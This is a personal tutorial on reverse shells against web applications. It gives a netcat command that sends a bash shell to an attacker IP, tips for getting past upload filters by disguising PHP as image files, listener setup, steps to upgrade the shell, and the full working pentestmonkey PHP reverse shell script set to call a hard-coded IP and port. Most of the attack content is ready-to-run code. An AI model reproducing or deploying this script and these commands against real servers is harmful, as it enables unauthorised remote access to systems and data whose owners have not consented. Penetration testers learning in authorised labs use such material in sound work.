Using reverse shell where the target server reaches out to you, or less common bind shell where it's the other way around, you reach out to server for the shell.
Why reverse shell is better?
Well by running an outbound connection we bypass the firewall rules.

First rev shell that I learned about is php reverse shell.
Which is a malicious php script that you can setup to call to your ip on a xyz port.
And run it on a vulnerable webapp.

Later there will be an example php rev shell with brief explanation.


Hopefully the if you are trying to upload the rev shell, the target would have some sort of security in place stopping you from running .php files or uploading them in the first place.

### Netcat for reverse shell
Using netcat to call out for a rev shell to an attacker machine. 
```bash
nc 192.168.1.1 4444 -e /bin/bash
```
### Script obfuscation 

In order to bypass some basic filters you can rename your file to script.php.png.
Possibly actually making the file a gif and putting code into it.

### How to make it work

In order for the script to execute and call to you, let's assume you already setup the script and uploaded it to the webapp, next thing you need to do is find that directory on path and go to that webpage.
When trying to access it the script will execute hopefully.

You will need to setup a netcat listener on your terminal to receive the connection.
```shell
nc -nvlp 4444
# netcat listening on port 4444
# l - listnen for inbound
# p - port number set
# n - numeric only ipv4
# v - verbose mode
```

Once connected odds are you will have a poor shell, that will just be a $ symbol.
You will be getting error/warning messages when trying to run su command or anything that is important to you like sudo and entering passwords.

### Upgrading your shell

You can upgrade your shell via some clever commands that will allow more functionality.
You could also try running netcat with a wrapper like rlwrap to have autocompletion and allow some other stuff like arrow keys. (up to you)

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

```shell
ps -p $$    # check process id of current shell
export TERM=xterm  # set terminal type to ensure functionality
^Z    # ctrl+z move current process in background
stty raw -echo    # set terminal type - raw mode w/ disabled terminal echo
fg   # resume process from background to foreground
```

This method works great for my uses.
Also there is another one which I had problems with for entering passwords it was broken.
```shell
/usr/bin/script -qc /bin/bash /dev/null
```

### Php script

```php
<?php
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip   = isset($_POST['ip']) ? $_POST['ip']   : '10.9.163.154';
$ip = '10.9.163.154';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$port  = isset($_POST['port']) ? $_POST['port']   : '4444';
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
```

This script includes some initial values set such as your ip and port.
Some code fore networking such as using sockets and keeping the connection alive.
Interacting with the shell via /bin/bash path and daemonizing the process aka running it in the background, and trying to avoid zombie processes aka hanging processes whose parent process stopped running for one or another rason.

Script also takes care I/O is piped to your connection using phps functionality.

Terminology:
- **Daemonize**: The process of converting a program into a background process that runs independently of any user or terminal session.
- **Zombie Process**: A child process that has completed execution but still has an entry in the process table because its parent has not yet read its exit status.
- **proc_open()**: A PHP function used to execute a command and open pipes to interact with its input, output, and error streams.